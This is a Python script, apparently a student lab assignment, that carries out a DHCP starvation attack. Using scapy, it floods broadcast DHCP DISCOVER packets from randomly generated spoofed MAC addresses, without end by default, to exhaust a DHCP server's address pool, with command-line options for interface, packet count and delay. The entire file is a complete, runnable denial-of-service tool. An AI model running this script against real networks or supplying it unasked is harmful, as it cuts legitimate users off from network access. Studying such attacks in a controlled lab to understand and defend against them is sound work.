#!/usr/bin/env python3
"""
==============================================================
  DHCP Starvation Attack Script
  Autor   : Ashley Fabian
  Matrícula: 2025-0773
  Script  : AshleyFabian_2025-0773_DHCP_Starvation_P1.py
==============================================================
"""

import argparse
import random
import time
import os
import sys
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )

def mac_to_bytes(mac):
    return bytes(int(x, 16) for x in mac.split(":")) + b"\x00" * 10

def build_discover(src_mac, xid):
    return (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac_to_bytes(src_mac), xid=xid, flags=0x8000) /
        DHCP(options=[
            ("message-type", "discover"),
            ("param_req_list", [1, 3, 6, 15]),
            "end"
        ])
    )

def attack(iface, count, delay):
    print("\n[*] DHCP Starvation — Ashley Fabian (2025-0773)")
    print(f"[*] Interfaz: {iface} | Paquetes: {'inf' if count==0 else count}\n")
    conf.verb = 0
    sent = 0
    try:
        while count == 0 or sent < count:
            mac = random_mac()
            xid = random.randint(0, 0xFFFFFFFF)
            sendp(build_discover(mac, xid), iface=iface, verbose=False)
            sent += 1
            if sent % 50 == 0:
                print(f"[+] DISCOVER enviados: {sent} | MAC: {mac}", end="\r")
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n[!] Detenido. Total: {sent}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", required=True)
    parser.add_argument("-c", "--count", type=int, default=0)
    parser.add_argument("-d", "--delay", type=float, default=0)
    args = parser.parse_args()
    attack(args.iface, args.count, args.delay)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Ejecutar como root.")
        sys.exit(1)
    main()
